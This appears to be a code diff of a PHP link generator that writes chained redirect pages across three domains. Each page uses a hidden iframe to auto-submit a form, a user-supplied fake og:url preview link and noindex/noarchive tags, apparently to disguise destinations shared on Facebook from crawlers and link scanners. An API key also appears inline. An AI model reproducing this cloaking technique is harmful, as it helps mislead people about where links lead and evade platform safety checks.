@@ -81,21 +81,48 @@ if (!isset($_SESSION['UserData']['Username'])) {
     <br>
     </form>
     <?php
+$listDomains = [
+    'http://tuurl.info/',
+    'http://minhurl.info/',
+    'http://phucurl.info/',
+];
+
+$tuDomain = 'http://tuurl.info';
+$minhDomain = 'http://minhurl.info';
+$phucDomain = 'http://phucurl.info';
+
+function generateRandomString($length = 100)
+{
+    return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-', ceil($length / strlen($x)))), 1, $length);
+}
+
 error_reporting(0);
 if ($_POST["url"]) {
     // $n=rand(0000,9999);
-    $pathname = substr(md5(microtime()), rand(0, 26), 10);
+    // $pathname = substr(md5(microtime()), rand(0, 26), 500);
+    $pathname = generateRandomString();
     $filePhp = $pathname . ".php";
     $fileHtml = $pathname . ".html";
+
+    $tuHtml = './tu/' . $pathname . ".html";
+    $minhHtml = './minh/' . $pathname . ".html";
+    $phucHtml = './phuc/' . $pathname . ".html";
+
+    $tuUrl = $tuDomain . '/tu/' . $pathname . ".html";
+    $minhUrl = $minhDomain . '/minh/' . $pathname . ".html";
+    $phucUrl = $phucDomain . '/phuc/' . $pathname . ".html";
 
     $fakeLink = $_POST['fake_link'];
     $mainLink = $_POST['url'] . '/?utm_source=' . $_POST['user'] . '&utm_medium=Facebook';
     $fphp = fopen($filePhp, 'w');
     $fhtml = fopen($fileHtml, 'w');
+    $fTuHtml = fopen($tuHtml, 'w');
+    $fMinhHtml = fopen($minhHtml, 'w');
+    $fPhucHtml = fopen($phucHtml, 'w');
 
     $htmlString = "
-  <!DOCTYPE html>
-  <html>
+    <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+  <html xmlns=\"http://www.w3.org/1999/xhtml\">
   <head>
   <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">
   <title></title>
@@ -113,7 +140,7 @@ if ($_POST["url"]) {
 
   <script>
   function go() {
-  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$mainLink\";></form>';
+  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$tuUrl\";></form>';
   window.frames[0].document.forms[0].submit();
   }
   </script>
@@ -121,9 +148,80 @@ if ($_POST["url"]) {
   </body>
   </html>
     ";
+    $htmlTu = "
+<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
+<meta name=\"googlebot\" content=\"noarchive\"/>
+<meta content=\"noindex, nofollow\" name=\"robots\"/>
+<title>Loading......</title>
+<meta property=\"og:url\" content=\"$fakeLink\"/>
+</head>
+<body>
+  <script>
+  function go() {
+  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$minhUrl\";></form>';
+  window.frames[0].document.forms[0].submit();
+  }
+  </script>
+  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
+  </body>
+  </html>
+
+    ";
+
+    $htmlMinh = "
+<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
+<meta name=\"googlebot\" content=\"noarchive\"/>
+<meta content=\"noindex, nofollow\" name=\"robots\"/>
+<title>Loading......</title>
+<meta property=\"og:url\" content=\"$fakeLink\"/>
+</head>
+<body>
+  <script>
+  function go() {
+  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$phucUrl\";></form>';
+  window.frames[0].document.forms[0].submit();
+  }
+  </script>
+  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
+  </body>
+  </html>
+
+    ";
+
+    $htmlPhuc = "
+<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
+<meta name=\"googlebot\" content=\"noarchive\"/>
+<meta content=\"noindex, nofollow\" name=\"robots\"/>
+<title>Loading......</title>
+<meta property=\"og:url\" content=\"$fakeLink\"/>
+</head>
+<body>
+  <script>
+  function go() {
+  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$mainLink\";></form>';
+  window.frames[0].document.forms[0].submit();
+  }
+  </script>
+  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
+  </body>
+  </html>
+
+    ";
 
     fwrite($fhtml, $htmlString);
     fclose($fhtml);
+    fwrite($fTuHtml, $htmlTu);
+    fclose($fTuHtml);
+    fwrite($fMinhHtml, $htmlMinh);
+    fclose($fMinhHtml);
+    fwrite($fPhucHtml, $htmlPhuc);
+    fclose($fPhucHtml);
 
     $redirectString = "
     <script type='text/javascript'>// <![CDATA[
@@ -152,7 +250,8 @@ exit;
     fwrite($fphp, $phpString);
     fclose($fphp);
     // echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
-    $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
+    // $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
+    $lurl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
     $curl = curl_init();
     $post_data = array('format' => 'text',
         'apikey' => '85D97C460CDBCAEBIB5A',
